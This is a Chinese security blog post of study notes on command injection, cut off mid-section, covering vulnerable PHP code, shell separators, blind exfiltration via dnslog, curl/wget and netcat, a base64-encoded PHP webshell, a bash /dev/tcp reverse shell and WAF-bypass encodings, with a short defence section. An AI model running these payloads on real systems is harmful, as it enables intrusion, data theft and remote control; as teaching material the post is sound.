<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png"><link rel="icon" href="/img/fluid.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="author" content="wanf3ng"><meta name="keywords" content="网络安全,晚风,wanf3ng"><meta name="description" content="原理应用中用到外部命令或程序，参数需要用户输入时，没有对用户的输入做检查，造成执行了预期之外的命令。举个栗子，下面是一个返回ping结果的程序，直接将用户可控的ip这个参数拼接进了命令，就可以提交其他的命令，从而造成命令执行 12345&lt;?php   echo &amp;#x27;&lt;pre&gt;&amp;#x27;;  echo shell_exec(&amp;#x27;ping -c 4 &amp;#x27;."><meta property="og:type" content="article"><meta property="og:title" content="命令执行漏洞学习笔记"><meta property="og:url" content="https://wanf3ng.github.io/2022/05/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html"><meta property="og:site_name" content="wanf3ng&#39;s blog"><meta property="og:description" content="原理应用中用到外部命令或程序，参数需要用户输入时，没有对用户的输入做检查，造成执行了预期之外的命令。举个栗子，下面是一个返回ping结果的程序，直接将用户可控的ip这个参数拼接进了命令，就可以提交其他的命令，从而造成命令执行 12345&lt;?php   echo &amp;#x27;&lt;pre&gt;&amp;#x27;;  echo shell_exec(&amp;#x27;ping -c 4 &amp;#x27;."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://s2.loli.net/2022/05/21/PEX5BHGcTuylhtJ.jpg"><meta property="article:published_time" content="2022-05-18T15:08:46.000Z"><meta property="article:modified_time" content="2022-05-31T08:28:00.000Z"><meta property="article:author" content="wanf3ng"><meta property="article:tag" content="命令执行"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://s2.loli.net/2022/05/21/PEX5BHGcTuylhtJ.jpg"><meta name="referrer" content="no-referrer-when-downgrade"><title>命令执行漏洞学习笔记 - wanf3ng&#39;s blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/custom.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"wanf3ng.github.io",root:"/",version:"1.9.5-a",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!0,baidu:"952845559a725a8f8506594fda37c635",google:{measurement_id:null},tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml",include_content_in_search:!0};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>if(!Fluid.ctx.dnt){var _hmt=_hmt||[];!function(){var t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?952845559a725a8f8506594fda37c635";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()}</script><script async>Fluid.ctx.dnt||Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=",(function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","")}))</script><meta name="generator" content="Hexo 6.3.0"><link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>晚风</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span>首页</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span>归档</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span>分类</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span>标签</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span>关于</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/default.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="命令执行漏洞学习笔记"></span></div><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> wanf3ng </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2022-05-18 23:08" pubdate>2022年5月18日 晚上</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 6.9k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 58 分钟 </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> 次</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">命令执行漏洞学习笔记</h1><div class="markdown-body"><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>应用中用到外部命令或程序，参数需要用户输入时，没有对用户的输入做检查，造成执行了预期之外的命令。举个栗子，下面是一个返回ping结果的程序，直接将用户可控的ip这个参数拼接进了命令，就可以提交其他的命令，从而造成命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php <br>  echo &#x27;&lt;pre&gt;&#x27;;<br>  echo shell_exec(&#x27;ping -c 4 &#x27;. $_GET[ip]); <br>  echo &#x27;&lt;/pre&gt;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><p>php中能调用外部命令的常见函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(args)                                有回显<br><span class="hljs-title function_ invoke__">passthru</span>(args)								(有回显)<br><span class="hljs-title function_ invoke__">exec</span>(args) 									（回显最后一行-必须 <span class="hljs-keyword">echo</span> 输出）<br><span class="hljs-title function_ invoke__">shell_exec</span>(args) 							（无回显-必须输出）<br>反引号：``<br>    <br><span class="hljs-title function_ invoke__">popen</span>(handle,mode)							(无回显)<br><span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&#x27;cmd&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)				（无回显）<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&#x27;dir&#x27;</span>,<span class="hljs-variable">$des</span>,<span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">stream_get_contents</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])<br>    <br>putenv<br>assert<br>pcntl_exec<br>COM组件<br></code></pre></td></tr></table></figure><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="分号"><a href="#分号" class="headerlink" title="分号;"></a>分号;</h2><p>用分号可以分隔多条命令，命令按照从左到右的顺序执行。当一条命令执行失败时，不会中断其他命令的执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 127.1;<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h2 id="管道命令"><a href="#管道命令" class="headerlink" title="管道命令|"></a>管道命令|</h2><p>管道符可以将前一个命令的标准输出变成后一个命令的标准输入，当前一个命令执行失败后，会执行后一个命令。ip的位置输入1是为了让ping报错，从而立即执行后一条命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 1|<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h2 id="后台任务符号"><a href="#后台任务符号" class="headerlink" title="后台任务符号&amp;"></a>后台任务符号&amp;</h2><p>此符号的作用是使shell在后台执行该条命令，这个命令有个缺陷就是两个命令的输出会混淆在一起</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 127.1&amp;<span class="hljs-built_in">cat</span> /etc/passwd&amp;<br></code></pre></td></tr></table></figure><h2 id="逻辑与"><a href="#逻辑与" class="headerlink" title="逻辑与&amp;&amp;"></a>逻辑与&amp;&amp;</h2><p>按顺序执行命令，命令之间是逻辑与关系，只有前面的命令执行成功后才会执行后面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 127.1&amp;&amp;<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h2 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或||"></a>逻辑或||</h2><p>按顺序执行命令，命令之间是逻辑或关系，前面的命令执行失败后才会执行后面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 1||<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号&#96;"></a>反引号&#96;</h2><p>将一个命令将被执行时，会首先解析反引号之间的内容，比如”echo `whoami`“，会先执行<code>whoami</code>，再<code>echo</code>出来</p><h2 id="command-命令执行"><a href="#command-命令执行" class="headerlink" title="$(command)命令执行"></a>$(command)命令执行</h2><p>作用同反引号，也是先执行括号中的内容，再将结果和前面的命令一起执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 $(<span class="hljs-built_in">whoami</span>)<br></code></pre></td></tr></table></figure><h2 id="win命令连接符"><a href="#win命令连接符" class="headerlink" title="win命令连接符"></a>win命令连接符</h2><p><code>| &amp; || &amp;&amp;</code>跟linux一样</p><h2 id="回显敏感信息"><a href="#回显敏感信息" class="headerlink" title="回显敏感信息"></a>回显敏感信息</h2><p>win下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span> c:\windows\win.ini<br></code></pre></td></tr></table></figure><p>linux下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h2 id="无回显利用方法"><a href="#无回显利用方法" class="headerlink" title="无回显利用方法"></a>无回显利用方法</h2><p>碰到命令执行，有回显的情况是少数，大多数情况都是无回显。这里分享一些无回显时的攻击方法。首先要判断是否存在命令执行漏洞，可以利用sleep命令，payload比如<code>ip=|sleep 5</code>，如果延迟5秒返回了结果，则存在漏洞。</p><h3 id="带外通信-dnslog"><a href="#带外通信-dnslog" class="headerlink" title="带外通信 - dnslog"></a>带外通信 - dnslog</h3><p>dnslog是一个通过dns查询将信息外传的方法。简单的说，将需要外传的信息附在dns查询上，最终的查询肯定会请求到自己掌控的dns域上，就可以看到相应的dns请求，从而获得附在dns查询上的信息。并且dns查询不像http请求那样容易被检测到，隐蔽性好。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping `<span class="hljs-built_in">whoami</span>`.pulsok.ceye.io<br></code></pre></td></tr></table></figure><p><img src="/image-20220521183049549.png" srcset="/img/loading.gif" lazyload alt="image-20220521183049549"></p><p><img src="/image-20220521183008203.png" srcset="/img/loading.gif" lazyload alt="image-20220521183008203"></p><p>发起ping命令即可发出dns请求，就能在dnslog平台上看到外传的信息</p><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>如果存在漏洞的页面是web服务或者说存在漏洞的服务器上运行着web服务器，且有权限写入，可以利用shell命令写入webshell后门到网站目录，访问即可获得webshelll</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg==&quot;</span>|<span class="hljs-built_in">base64</span> -d &gt;shell.php<br></code></pre></td></tr></table></figure><p>这里用了base64将一句话木马加密了，可以绕过部分waf的检查</p><h3 id="http访问日志"><a href="#http访问日志" class="headerlink" title="http访问日志"></a>http访问日志</h3><p>最基础的一种方法，在自己的服务器上起一个http服务器，只要有请求访问就有日志，把要外传的信息跟在http请求中访问自己的http服务器，即可在访问日志中查看到要接收的信息。http服务器话，可以用python起一台小型web服务器，非常方便。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>如下图，用curl发起http请求，带上<code>whoami</code>的查询结果。下面web访问日志中的<code>www-data</code>就是对应<code>whoami</code>的执行结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 ||curl http://[ip]/`<span class="hljs-built_in">whoami</span>`<br></code></pre></td></tr></table></figure><p><img src="/image-20220521194440765.png" srcset="/img/loading.gif" lazyload alt="image-20220521194440765"></p><p>同样也可以用wget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 ||wget http://[ip]/`<span class="hljs-built_in">whoami</span>`<br></code></pre></td></tr></table></figure><h3 id="nc传文件"><a href="#nc传文件" class="headerlink" title="nc传文件"></a>nc传文件</h3><p>一般服务器上都有netcat命令，可以利用这个命令发送文件到远程服务器上。比如，在自己的服务器上运行监听9999端口的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lp 9999 &gt; passwd<br></code></pre></td></tr></table></figure><p>在存在命令执行漏洞的服务器上执行发送文件的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc [my server ip] 9999 &lt;/etc/passwd<br></code></pre></td></tr></table></figure><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>反弹shell是从内部的受控端（也就是存在命令执行漏洞的服务器），主动连接外部远程服务器，所以防火墙一般不会拦截。</p><p>自己的服务器上nc监听命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 8080<br></code></pre></td></tr></table></figure><p>存在命令执行漏洞的服务器上反弹shell，每种编程语言都可以用sock发送请求，这里只演示最基础的bash反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &amp;&gt; /dev/tcp/192.168.1.57/8080 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img src="/image-20220522132334280.png" srcset="/img/loading.gif" lazyload alt="image-20220522132334280"></p><p><img src="/image-20220522132112980.png" srcset="/img/loading.gif" lazyload alt="image-20220522132112980"></p><p>如果有waf拦截，可以把语句base64加密后再在存在漏洞的服务器上执行</p><p>上面语句用base64做一下变形：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;YmFzaCAtaSAmPiAvZGV2L3RjcC8xOTIuMTY4LjEuNTcvODA4MCAwPiYx&quot;</span>|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><p><img src="/image-20220522132754459.png" srcset="/img/loading.gif" lazyload alt="image-20220522132754459"></p><p>vps上监听并得到一个反弹shell：</p><p><img src="/image-20220522132822587.png" srcset="/img/loading.gif" lazyload alt="image-20220522132822587"></p><h3 id="极端情况"><a href="#极端情况" class="headerlink" title="极端情况"></a>极端情况</h3><ul><li>服务器未联网</li><li>无回显</li><li>无法利用上述的无回显命令执行姿势</li><li>无写入权限</li><li>各种未知原因无法getshell</li><li>等等…</li></ul><p>如果不幸碰到上述情况，那么最后只有一种方法，尝试一下枚举or二分法爆破文件内容，主要利用sleep命令时间盲注，自己写个脚本跑一下</p><h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol><li>不执行外部的应用程序或命令，尽量使用自定义的函数或开源的函数库来实现相应的功能</li><li>php可以使用<code>escapeshellarg</code>和<code>escapeshellcmd</code>这两个函数来转义用户的输入</li><li>使用safe_mode_exec_dir设置可执行的文件目录。将php.ini中的safe_mode设置为On，然后将允许执行的可执行文件放入一个目录，并使用safe_mode_exec_dir指定这个可执行的文件路径。这样在执行相应的外部程序时，比如在safe_mode_exec_dir指定目录中才会允许执行，否则将执行失败</li><li>把<code>system</code>、<code>exec_shell</code>等命令加入disable_functions（也会被绕过）</li></ol><h1 id="命令相关知识"><a href="#命令相关知识" class="headerlink" title="命令相关知识"></a>命令相关知识</h1><h2 id="和"><a href="#和" class="headerlink" title="()和{}"></a>()和{}</h2><p>把几个命令合在一起执行，shell中有两种方法：</p><ul><li>(command1;command2;command3;…)</li><li>{ command1;command2;command3;…command;}</li></ul><p>注意使用{}时第一条命令必须与左边括号有一个空格，最后一条命令一定要有分号。</p><p>并且()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令。</p><p>不同点是：()是重新开一个子shell执行命令，{}在当前shell执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ./fl&#123;a,b,c,d&#125;g<br><br>执行结果：<br><span class="hljs-built_in">cat</span>: flag: No such file or directory<br><span class="hljs-built_in">cat</span>: flbg: No such file or directory<br><span class="hljs-built_in">cat</span>: flcg: No such file or directory<br><span class="hljs-built_in">cat</span>: fldg: No such file or directory<br></code></pre></td></tr></table></figure><h2 id="shell输入输出重定向"><a href="#shell输入输出重定向" class="headerlink" title="shell输入输出重定向"></a>shell输入输出重定向</h2><p>大多数 UNIX 系统命令从终端接受输入并将所产生的输出发送回到终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。</p><p>命令说明：</p><ul><li>command &gt; file：输出重定向到file。</li><li>command &lt; file：输入重定向到file。</li><li>command &gt;&gt; file：输出以追加的方式重定向到file。</li><li>n &gt; file：将文件描述符为n的文件重定向到file。</li><li>n &gt;&gt; file：将文件描述符为n的文件以追加的方式重定向到file。</li><li>n &gt;&amp; m：将输出文件m和n合并。</li><li>n &lt;&amp; m：将输入文件m和n合并。</li><li>&lt;&lt; tag：将开始标记tag和结束标记tag之间的内容作为输入。</li></ul><p>此外，文件描述符通常是这样的：</p><ul><li>0：标准输入（STDIN）</li><li>1：标准输出（STDOUT）</li><li>2：标准错误输出（STDERR）</li></ul><h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><ul><li>^：匹配输入字符串的开始位置</li><li>$：匹配输入字符串的结束位置</li><li>*：匹配前面的子表达式零次或多次</li><li>+：匹配前面的子表达式一次或多次</li><li>?：匹配前面的子表达式零次或一次</li><li>{n}：n是一个非负整数，匹配确定的n次</li><li>{n,}：n是一个非负整数，至少匹配n次</li><li>{n,m}：m、n均是非负整数，并且n&lt;&#x3D;m，最少匹配n次，最多匹配m次</li><li>.：匹配除换行符（\n，\r）以外的任何单个字符</li><li>[xyz]：字符集合，匹配所有包含的任意一个字符</li><li>非贪婪?：当?紧跟在任何一个其他限制符(*，+，?，,{n}，{n,}，{n,m})后面时，匹配是非贪婪的，非贪婪模式是指尽可能少地去匹配。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ./fl[a-z]g<br><span class="hljs-built_in">cat</span> ./fl*g<br><span class="hljs-built_in">cat</span> ./fl?g<br></code></pre></td></tr></table></figure><p>{xxx}和[xxx]有个重要区别，如果匹配的文件不存在，[xxx]会失去模式的功能，变成一个单纯的字符串，而{xxx}还是可以展开。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ./fl[a-z]g	<span class="hljs-comment"># 得到结果就只有存在的文件</span><br><br><span class="hljs-built_in">cat</span> ./fl&#123;a,b,c&#125;g <br><span class="hljs-comment"># 得到的结果是每一个都会去尝试打开，但是不存在的会提示</span><br><span class="hljs-built_in">cat</span>: ./flbg: No such file or directory<br></code></pre></td></tr></table></figure><h2 id="内置通用字符簇"><a href="#内置通用字符簇" class="headerlink" title="内置通用字符簇"></a>内置通用字符簇</h2><p>也是shell正则的知识</p><ul><li>[[:alpha:]]：任何字母</li><li>[[:digit:]]：任何数字</li><li>[[:alnum:]]：任何字母和数字</li><li>[[:space:]]：任何空白字符</li><li>[[:upper:]]：任何大写字母</li><li>[[:lower:]]：任何小写字母</li><li>[[:punct:]]：任何标点符号</li><li>[[:xdigit:]]：任何16进制的数字，相当于[0-9a-fA-F]</li></ul><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ul><li>&lt;&gt;</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>&lt;&gt;./flag<br></code></pre></td></tr></table></figure><ul><li>$IFS（IFS的默认值是空白，也包括空格，tab，新行）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span>./flag<br><span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9flag</span> <span class="hljs-comment">#$9可改成$加其他数字</span><br></code></pre></td></tr></table></figure><h2 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h2><ul><li>$</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca$*t ./flag<br>ca<span class="hljs-variable">$@t</span> ./flag<br>ca<span class="hljs-variable">$2t</span> ./flag<br>ca<span class="hljs-variable">$&#123;11&#125;</span>t ./flag <br></code></pre></td></tr></table></figure><ul><li>反斜杠</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t ./flag<br></code></pre></td></tr></table></figure><ul><li>变量拼接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=ca;b=t;c=/etc/passwd<br>$a<span class="hljs-variable">$b</span> <span class="hljs-variable">$c</span><br></code></pre></td></tr></table></figure><ul><li>利用切割字符串拼凑</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=<span class="hljs-string">&#x27;lqwes&#x27;</span>;b=<span class="hljs-variable">$&#123;a:0:1&#125;</span><span class="hljs-variable">$&#123;a:4:1&#125;</span>;<span class="hljs-variable">$b</span><br><span class="hljs-comment"># 此时$b=&#x27;ls&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h2><p>$1到$9、$@和$*等，相当于空字符串</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ca<span class="hljs-variable">$</span>&#123;<span class="hljs-number">9</span>&#125;t /etc/passwd<br><span class="hljs-built_in">cat</span> <span class="hljs-built_in">fl</span><span class="hljs-variable">$1ag</span>.php<br><span class="hljs-built_in">cat</span> <span class="hljs-built_in">fl</span><span class="hljs-variable">$</span>@ag.php<br></code></pre></td></tr></table></figure><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> “Y2F0IC4vZmxhZwo=” |<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><h2 id="16进制"><a href="#16进制" class="headerlink" title="16进制"></a>16进制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;0x636174202e2f666c6167&quot;</span> |xxd -r -p|bash<br></code></pre></td></tr></table></figure><h2 id="8进制"><a href="#8进制" class="headerlink" title="8进制"></a>8进制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\143\141\164\40\56\57\146\154\141\147&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="双引号和单引号"><a href="#双引号和单引号" class="headerlink" title="双引号和单引号"></a>双引号和单引号</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&quot;t&quot;</span> ./flag<br>ca<span class="hljs-string">&#x27;t&#x27;</span> ./flag<br>c<span class="hljs-string">&#x27;&#x27;</span>at fl<span class="hljs-string">&#x27;&#x27;</span>ag.php<br>c<span class="hljs-string">&quot;&quot;</span>at fl<span class="hljs-string">&quot;&quot;</span>ag.php<br></code></pre></td></tr></table></figure><h2 id="幂符号"><a href="#幂符号" class="headerlink" 